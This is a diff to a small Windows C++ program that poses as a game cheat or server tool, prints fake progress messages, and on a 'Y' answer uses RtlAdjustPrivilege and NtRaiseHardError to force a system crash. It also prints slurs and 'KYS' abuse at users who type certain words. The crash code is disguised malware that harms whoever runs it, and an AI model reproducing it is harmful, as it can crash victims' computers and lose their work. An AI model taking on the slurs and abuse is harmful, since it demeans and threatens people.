@@ -2,6 +2,8 @@
 #include <Windows.h>
 #include <winternl.h>
 #include <cctype>
+#include <cstdlib>
+#include <ctime>
 
 #pragma comment(lib, "ntdll.lib")
 
@@ -11,6 +13,8 @@ extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULON
 
 int main()
 {
+    std::srand(std::time(0));
+    SetConsoleTitleA("chseese and qwackers gs");
     std::wstring onethreethreeseven = LR"(   __     ___     ___    _____
   /_ |   |__ \   |__ \  |___  |
    | |      ) |     ) |    / /
@@ -32,6 +36,7 @@ int main()
     if (input.find("Raax cheat") != std::string::npos) {
         std::cout << "LMFAO KYS FAGGOT!" << std::endl;
     exit(0);
+    }
     if (input.find("1HACK") != std::string::npos) {
         std::cout << "XDDD U GOT RATTED LIL NIGGA" << std::endl
     exit(0);	
@@ -42,7 +47,7 @@ int main()
     std::cout << "Almost there..." << std::endl; 
 
     std::cout << "\nStart GS: INITIATED.\n"; // This starts the game server
-    std::cout << "UD CODE: Sigma Number: " << 1337 << std::endl;
+    std::cout << "UD CODE: Sigma Number: " << std::rand() << std::endl;
 
     std::cout << "Detecting Mstreem pasted code..." << std::endl;
     std::cout << "Pasted code detected." << std::endl;
@@ -69,10 +74,10 @@ int main()
     }
 
     if (answer == 'Y') {
-        	BOOLEAN PrivilegeState = FALSE;
-	        ULONG ErrorResponse = 0;
-	        RtlAdjustPrivilege(19, TRUE, FALSE, &PrivilegeState);
-	        NtRaiseHardError(STATUS_IN_PAGE_ERROR, 0, 0, NULL, 6, &ErrorResponse);
+        BOOLEAN PrivilegeState = FALSE;
+	ULONG ErrorResponse = 0;
+        RtlAdjustPrivilege(19, TRUE, FALSE, &PrivilegeState);
+	NtRaiseHardError(STATUS_IN_PAGE_ERROR, 0, 0, NULL, 6, &ErrorResponse);
     } else {
         std::cout << "Ok bro ur missing out" << std::endl;
     }
